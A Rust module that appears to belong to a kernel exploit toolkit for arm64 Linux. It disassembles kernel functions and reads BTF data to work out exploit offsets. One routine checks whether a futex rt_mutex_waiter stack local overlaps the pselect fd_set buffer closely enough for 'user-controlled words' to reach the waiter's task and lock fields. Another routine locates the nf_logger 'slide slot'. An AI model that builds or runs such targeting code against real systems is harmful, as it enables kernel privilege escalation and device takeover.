//! Disassembly-driven derivation: pselect/futex waiter layout and the
//! nf_logger slide slot. Direct ports of the Python analysis.

use std::collections::{BTreeMap, BTreeSet};

use regex::Regex;

use crate::btf::Btf;
use crate::disasm::{
    add_sp_immediates, cmp_immediates, disassemble_range, first_sp_frame, has_direct_call,
    is_mov_w0_wzr, is_mov_x1, materialized_address, validate_frame_live_at,
};
use crate::error::{ExtractError, Result};
use crate::kallsyms::unique_or_err;

pub const PSELECT_ROUTE_NFDS: u64 = 320;
pub const OBJDUMP_CAP: usize = 0x2000;

pub type RelSymbols = BTreeMap<String, BTreeSet<u64>>;

/// Rebase kallsyms onto _text and return a sorted list of all offsets.
pub fn relative_symbols(
    symbols: &BTreeMap<String, BTreeSet<u64>>,
    base: u64,
) -> (RelSymbols, Vec<u64>) {
    let mut relative: RelSymbols = BTreeMap::new();
    let mut all_offsets: BTreeSet<u64> = BTreeSet::new();
    for (name, values) in symbols {
        let offsets: BTreeSet<u64> = values
            .iter()
            .filter(|value| **value >= base)
            .map(|value| *value - base)
            .collect();
        if !offsets.is_empty() {
            relative.insert(name.clone(), offsets.clone());
            all_offsets.extend(offsets);
        }
    }
    let sorted: Vec<u64> = all_offsets.into_iter().collect();
    (relative, sorted)
}

pub fn unique_offset(symbols: &RelSymbols, name: &str) -> Result<u64> {
    unique_or_err(symbols, name)
}

pub fn unique_offset_optional(symbols: &RelSymbols, name: &str) -> Option<u64> {
    unique_offset(symbols, name).ok()
}

fn disassemble_symbol(
    kernel: &[u8],
    symbols: &RelSymbols,
    sorted_offsets: &[u64],
    name: &str,
    cap: usize,
) -> Result<Vec<String>> {
    let start = unique_offset(symbols, name)? as usize;
    let higher = sorted_offsets.iter().find(|off| **off as usize > start);
    let stop = (start + cap).min(higher.map_or(start + cap, |off| *off as usize));
    disassemble_range(kernel, start, stop)
}

pub struct PselectLayout {
    pub shift: u64,
    pub waiter_local: u64,
    pub pselect_word0: i64,
    pub futex_waiter: i64,
    pub pselect_buffer: u64,
    pub chain: String,
    pub futex_chain: String,
    pub frames: BTreeMap<String, u64>,
}

pub fn derive_pselect_layout(
    kernel: &[u8],
    symbols: &RelSymbols,
    sorted_offsets: &[u64],
    btf: &Btf,
    route_nfds: u64,
) -> Result<PselectLayout> {
    let mut names: Vec<(&str, &str)> = vec![
        ("pselect_wrapper", "__arm64_sys_pselect6"),
        ("pselect_core", "core_sys_select"),
        ("futex_wrapper", "__arm64_sys_futex"),
        ("futex_dispatch", "do_futex"),
        ("futex_wait", "futex_wait_requeue_pi"),
    ];
    if unique_offset_optional(symbols, "do_pselect").is_some() {
        names.push(("pselect_dispatch", "do_pselect"));
    }

    let mut dis: BTreeMap<&str, Vec<String>> = BTreeMap::new();
    for (key, name) in &names {
        dis.insert(
            key,
            disassemble_symbol(kernel, symbols, sorted_offsets, name, OBJDUMP_CAP)?,
        );
    }

    let mut pselect_chain = vec!["pselect_wrapper"];
    let pselect_core_addr = unique_offset(symbols, "core_sys_select")?;
    if has_direct_call(&dis["pselect_wrapper"], pselect_core_addr) {
        // inline path
    } else if names.iter().any(|(k, _)| *k == "pselect_dispatch") {
        let dispatch_addr = unique_offset(symbols, "do_pselect")?;
        if !has_direct_call(&dis["pselect_wrapper"], dispatch_addr) {
            return Err(ExtractError::new(
                "__arm64_sys_pselect6 calls neither core_sys_select nor do_pselect",
            ));
        }
        if !has_direct_call(&dis["pselect_dispatch"], pselect_core_addr) {
            return Err(ExtractError::new(
                "do_pselect does not directly call core_sys_select",
            ));
        }
        pselect_chain.push("pselect_dispatch");
    } else {
        return Err(ExtractError::new(
            "__arm64_sys_pselect6 calls neither core_sys_select nor do_pselect",
        ));
    }
    pselect_chain.push("pselect_core");

    let mut futex_chain = vec!["futex_wrapper"];
    let futex_wait_addr = unique_offset(symbols, "futex_wait_requeue_pi")?;
    if has_direct_call(&dis["futex_wrapper"], futex_wait_addr) {
        // direct path
    } else if has_direct_call(&dis["futex_wrapper"], unique_offset(symbols, "do_futex")?) {
        if !has_direct_call(&dis["futex_dispatch"], futex_wait_addr) {
            return Err(ExtractError::new(
                "do_futex does not directly call futex_wait_requeue_pi",
            ));
        }
        futex_chain.push("futex_dispatch");
    } else {
        return Err(ExtractError::new(
            "__arm64_sys_futex calls neither do_futex nor futex_wait_requeue_pi",
        ));
    }
    futex_chain.push("futex_wait");

    for (caller, callee) in pselect_chain.iter().zip(pselect_chain.iter().skip(1)) {
        let target = unique_offset(symbols, names.iter().find(|(k, _)| k == callee).unwrap().1)?;
        let anchor = Regex::new(&format!(r"(?i)\bbl\s+0x{target:x}\b")).unwrap();
        validate_frame_live_at(
            &dis[caller],
            &anchor,
            names.iter().find(|(k, _)| k == caller).unwrap().1,
        )?;
    }
    for (caller, callee) in futex_chain.iter().zip(futex_chain.iter().skip(1)) {
        let target = unique_offset(symbols, names.iter().find(|(k, _)| k == callee).unwrap().1)?;
        let anchor = Regex::new(&format!(r"(?i)\bbl\s+0x{target:x}\b")).unwrap();
        validate_frame_live_at(
            &dis[caller],
            &anchor,
            names.iter().find(|(k, _)| k == caller).unwrap().1,
        )?;
    }

    let mut frames: BTreeMap<String, u64> = BTreeMap::new();
    for (key, text) in &dis {
        let full_name = names.iter().find(|(k, _)| k == key).unwrap().1;
        frames.insert(format!("frame_{key}"), first_sp_frame(text, full_name)?);
    }

    // 6.6 names the rb_nodes tree/pi_tree; 6.1 calls them
    // tree_entry/pi_tree_entry (same offsets in the struct).
    let pi_tree = btf
        .field("rt_mutex_waiter", "pi_tree")
        .or_else(|| btf.field("rt_mutex_waiter", "pi_tree_entry"));
    let wake_state = btf.field("rt_mutex_waiter", "wake_state");
    if pi_tree.is_none() || wake_state.is_none() {
        return Err(ExtractError::new(
            "BTF rt_mutex_waiter.pi_tree/wake_state missing",
        ));
    }
    let pi_tree = pi_tree.unwrap() as u64;
    let wake_state = wake_state.unwrap() as u64;

    let mut waiter_candidates: Vec<(String, u64)> = Vec::new();
    for (reg, imm) in add_sp_immediates(&dis["futex_wait"]) {
        if pi_tree != 0 {
            let re = Regex::new(&format!(r"(?i)\badd\s+x\d+,\s*{reg},\s*#0x{pi_tree:x}\b"))
                .unwrap();
            if dis["futex_wait"].iter().any(|line| re.is_match(line)) {
                waiter_candidates.push((reg, imm));
            }
        } else {
            let re = Regex::new(&format!(r"(?i)\bstp\s+xzr,\s*xzr,\s*\[sp,\s*#0x{imm:x}\]"))
                .unwrap();
            if dis["futex_wait"].iter().any(|line| re.is_match(line)) {
                waiter_candidates.push((reg, imm));
            }
        }
    }
    // Several registers may materialize the same sp local; dedupe by offset.
    let mut seen = BTreeSet::new();
    waiter_candidates.retain(|(_, imm)| seen.insert(*imm));
    if waiter_candidates.len() != 1 {
        return Err(ExtractError::new(format!(
            "futex waiter stack local not unique: {waiter_candidates:?}"
        )));
    }
    let (waiter_reg, waiter_local) = &waiter_candidates[0];
    let anchor = Regex::new(&format!(
        r"(?i)\badd\s+{waiter_reg},\s*sp,\s*#0x{waiter_local:x}\b"
    ))
    .unwrap();
    validate_frame_live_at(&dis["futex_wait"], &anchor, "futex_wait")?;

    let mut required_fields = vec![*waiter_local];
    if wake_state != 0 {
        required_fields.push(waiter_local + wake_state);
    }
    for required in required_fields {
        let re = Regex::new(&format!(r"(?i)\[sp,\s*#0x{required:x}\]")).unwrap();
        if !dis["futex_wait"].iter().any(|line| re.is_match(line)) {
            return Err(ExtractError::new(format!(
                "futex waiter candidate 0x{waiter_local:x} not cross-validated \
                 by a real field store at 0x{required:x}"
            )));
        }
    }

    let add_sp = add_sp_immediates(&dis["pselect_core"]);
    let mut buffer_candidates: BTreeSet<u64> = BTreeSet::new();
    for (reg, imm) in &add_sp {
        let peers: Vec<&str> = add_sp
            .iter()
            .filter(|(peer, peer_imm)| peer_imm == imm && peer != reg)
            .map(|(peer, _)| peer.as_str())
            .collect();
        let any_cmp = peers.iter().any(|peer| {
            let re = Regex::new(&format!(r"(?i)\bcmp\s+{reg},\s*{peer}\b")).unwrap();
            let re2 = Regex::new(&format!(r"(?i)\bcmp\s+{peer},\s*{reg}\b")).unwrap();
            dis["pselect_core"]
                .iter()
                .any(|line| re.is_match(line) || re2.is_match(line))
        });
        if any_cmp {
            buffer_candidates.insert(*imm);
        }
    }
    if buffer_candidates.len() != 1 {
        let hex: Vec<String> = buffer_candidates.iter().map(|v| format!("{v:#x}")).collect();
        return Err(ExtractError::new(format!(
            "core_sys_select fd_set buffer candidates not unique: {hex:?}"
        )));
    }
    let pselect_buffer = *buffer_candidates.iter().next().unwrap();
    let buffer_regs: BTreeSet<String> = add_sp
        .iter()
        .filter(|(_, imm)| *imm == pselect_buffer)
        .map(|(reg, _)| reg.clone())
        .collect();
    if buffer_regs.is_empty() {
        return Err(ExtractError::new(
            "core_sys_select stack buffer has no output register",
        ));
    }
    let buffer_regs: Vec<String> = buffer_regs.into_iter().collect();
    for buffer_reg in &buffer_regs {
        let anchor = Regex::new(&format!(
            r"(?i)\badd\s+{buffer_reg},\s*sp,\s*#0x{pselect_buffer:x}\b"
        ))
        .unwrap();
        validate_frame_live_at(
            &dis["pselect_core"],
            &anchor,
            &format!("core_sys_select/{buffer_reg}"),
        )?;
    }

    let fds_bytes = ((route_nfds + 63) / 64) * 8;
    let thresholds = cmp_immediates(&dis["pselect_core"]);
    if !thresholds
        .iter()
        .any(|threshold| fds_bytes < *threshold && *threshold <= fds_bytes + 8)
    {
        return Err(ExtractError::new(format!(
            "core_sys_select threshold does not prove route_nfds={route_nfds} \
             uses the stack fd_set path"
        )));
    }

    let frame_sum: u64 = pselect_chain.iter().map(|key| frames[&format!("frame_{key}")]).sum();
    let pselect_word0 = -(frame_sum as i64) + pselect_buffer as i64;
    let futex_sum: u64 = futex_chain.iter().map(|key| frames[&format!("frame_{key}")]).sum();
    let futex_waiter = -(futex_sum as i64) + *waiter_local as i64;
    let delta = futex_waiter - pselect_word0;
    if delta < 0 || delta % 8 != 0 {
        return Err(ExtractError::new(format!(
            "pselect/futex overlap is not a non-negative qword: {delta}"
        )));
    }
    let shift = (delta / 8) as u64;
    if shift > 16 {
        return Err(ExtractError::infeasible(format!(
            "PSELECT_WAITER_WORD_SHIFT too large: {shift}"
        )));
    }
    if shift > 3 {
        return Err(ExtractError::infeasible(format!(
            "futex waiter starts {shift} qwords above the fd_set buffer; \
             task/lock would land outside the user-controlled words 0..14 \
             (max feasible shift is 3)"
        )));
    }
    if shift == 3 {
        eprintln!(
            "warning: waiter fits at the last usable word (shift=3); \
             wake_state falls outside the copied fd_set and relies on the \
             kernel zero-initialising it"
        );
    }
    let chain = pselect_chain
        .iter()
        .map(|key| names.iter().find(|(k, _)| k == key).unwrap().1)
        .collect::<Vec<_>>()
        .join("->");
    let futex_chain_str = futex_chain
        .iter()
        .map(|key| names.iter().find(|(k, _)| k == key).unwrap().1)
        .collect::<Vec<_>>()
        .join("->");
    Ok(PselectLayout {
        shift,
        waiter_local: *waiter_local,
        pselect_word0,
        futex_waiter,
        pselect_buffer,
        chain,
        futex_chain: futex_chain_str,
        frames,
    })
}

fn u32_at(data: &[u8], off: u64) -> Result<u32> {
    let off = off as usize;
    if off + 4 > data.len() {
        return Err(ExtractError::new(format!(
            "u32 read out of range: 0x{off:x}"
        )));
    }
    Ok(u32::from_le_bytes(data[off..off + 4].try_into().unwrap()))
}

pub struct NfLoggerInfo {
    pub loggers: u64,
    pub nfulnl_logger: u64,
    pub loggers_0_1: u64,
    pub nf_log_type_ulog: i64,
}

/// Derive loggers[0][NF_LOG_TYPE_ULOG] by disassembling nf_log_register /
/// nfnetlink_log_init and closing the slot index against BTF.
pub fn derive_nf_logger_registration(
    kernel: &[u8],
    symbols: &RelSymbols,
    sorted_offsets: &[u64],
    btf: &Btf,
) -> Result<NfLoggerInfo> {
    let register_text =
        disassemble_symbol(kernel, symbols, sorted_offsets, "nf_log_register", 0x800)?;
    let init_text =
        disassemble_symbol(kernel, symbols, sorted_offsets, "nfnetlink_log_init", 0x800)?;
    let logger = unique_offset(symbols, "nfulnl_logger")?;
    let loggers = unique_offset(symbols, "loggers")?;
    let type_off = btf
        .field("nf_logger", "type")
        .ok_or_else(|| ExtractError::new("BTF nf_logger.type missing"))?;
    if btf.direct_field_size("nf_logger", "type") != Some(4) {
        return Err(ExtractError::new(
            "BTF nf_logger.type is not a 4-byte enum",
        ));
    }
    let logger_type = u32_at(kernel, logger + type_off as u64)?;
    let ulog_value = btf
        .enum_value("nf_log_type", "NF_LOG_TYPE_ULOG")
        .ok_or_else(|| ExtractError::new("BTF NF_LOG_TYPE_ULOG missing"))?;
    let max_value = btf
        .enum_value("nf_log_type", "NF_LOG_TYPE_MAX")
        .ok_or_else(|| ExtractError::new("BTF NF_LOG_TYPE_MAX missing"))?;
    let nfproto_unspec = btf
        .unique_enum_member_value("NFPROTO_UNSPEC")
        .ok_or_else(|| ExtractError::new("BTF NFPROTO_UNSPEC missing"))?;
    if logger_type as i64 != ulog_value || !(0 <= ulog_value && ulog_value < max_value) {
        return Err(ExtractError::new(format!(
            "nfulnl_logger.type does not close with BTF NF_LOG_TYPE_ULOG: \
             data={logger_type}, ulog={ulog_value}, max={max_value}"
        )));
    }

    let logger_aliases: BTreeSet<String> = register_text
        .iter()
        .filter_map(|line| is_mov_x1(line))
        .collect();
    if logger_aliases.len() != 1 {
        return Err(ExtractError::new(format!(
            "nf_log_register logger alias not unique: {logger_aliases:?}"
        )));
    }
    let logger_reg = logger_aliases.iter().next().unwrap().clone();
    let type_load_re = Regex::new(&format!(
        r"(?i)\bldr\s+w(\d+),\s*\[{logger_reg},\s*#0x{type_off:x}\]"
    ))
    .unwrap();
    let mut type_loads: BTreeSet<String> = BTreeSet::new();
    for line in &register_text {
        for caps in type_load_re.captures_iter(line) {
            type_loads.insert(caps[1].to_string());
        }
    }
    if type_loads.len() != 1 {
        return Err(ExtractError::new(format!(
            "nf_log_register type load not unique: {type_loads:?}"
        )));
    }
    let type_reg = type_loads.iter().next().unwrap().clone();
    let adrp_re = Regex::new(r"(?i)\badrp\s+(x\d+),").unwrap();
    let mut base_regs: BTreeSet<String> = BTreeSet::new();
    for line in &register_text {
        for caps in adrp_re.captures_iter(line) {
            let reg = caps[1].to_ascii_lowercase();
            if materialized_address(&register_text, &reg, loggers) {
                base_regs.insert(reg);
            }
        }
    }
    let mut indexed: Vec<(String, String)> = Vec::new();
    for base_reg in &base_regs {
        let lsl4_re = Regex::new(&format!(
            r"(?i)\badd\s+(x\d+),\s*{base_reg},\s*(x\d+),\s*lsl\s*#4"
        ))
        .unwrap();
        for line in &register_text {
            for caps in lsl4_re.captures_iter(line) {
                let destination = caps[1].to_ascii_lowercase();
                let pf_reg = caps[2].to_ascii_lowercase();
                let lsl3_re = Regex::new(&format!(
                    r"(?i)\badd\s+{destination},\s*{destination},\s*x{type_reg},\s*lsl\s*#3"
                ))
                .unwrap();
                if register_text.iter().any(|l| lsl3_re.is_match(l)) {
                    indexed.push((destination, pf_reg));
                }
            }
        }
    }
    let mut deduped: Vec<(String, String)> = Vec::new();
    for entry in indexed {
        if !deduped.contains(&entry) {
            deduped.push(entry);
        }
    }
    if deduped.len() != 1 {
        return Err(ExtractError::new(format!(
            "nf_log_register loggers[pf][type] dataflow not unique: {deduped:?}"
        )));
    }
    let (slot_reg, _) = &deduped[0];
    let stlr_re = Regex::new(&format!(
        r"(?i)\bstlr\s+{logger_reg},\s*\[{slot_reg}\]"
    ))
    .unwrap();
    if !register_text.iter().any(|line| stlr_re.is_match(line)) {
        return Err(ExtractError::new(
            "nf_log_register does not store the logger to the slot",
        ));
    }
    let bound_re = Regex::new(&format!(r"(?i)\bcmp\s+w{type_reg},\s*#0x{max_value:x}\b"))
        .unwrap();
    if !register_text.iter().any(|line| bound_re.is_match(line)) {
        return Err(ExtractError::new(
            "nf_log_register type bound not closed with NF_LOG_TYPE_MAX",
        ));
    }

    let target = unique_offset(symbols, "nf_log_register")?;
    let call_re = Regex::new(&format!(r"(?i)\bbl\s+0x{target:x}\b")).unwrap();
    let calls: Vec<usize> = init_text
        .iter()
        .enumerate()
        .filter(|(_, line)| call_re.is_match(line))
        .map(|(index, _)| index)
        .collect();
    if calls.len() != 1 {
        return Err(ExtractError::new(format!(
            "nfnetlink_log_init -> nf_log_register calls: {}",
            calls.len()
        )));
    }
    let start = calls[0].saturating_sub(6);
    let call_window: Vec<String> = init_text[start..calls[0]].to_vec();
    if nfproto_unspec != 0 || !call_window.iter().any(|line| is_mov_w0_wzr(line)) {
        return Err(ExtractError::new(
            "nfnetlink_log_init does not register with NFPROTO_UNSPEC(0)",
        ));
    }
    if !materialized_address(&init_text, "x1", logger) {
        return Err(ExtractError::new(
            "nfnetlink_log_init x1 does not materialize nfulnl_logger",
        ));
    }
    let slot = loggers + ulog_value as u64 * 8;
    Ok(NfLoggerInfo {
        loggers,
        nfulnl_logger: logger,
        loggers_0_1: slot,
        nf_log_type_ulog: ulog_value,
    })
}
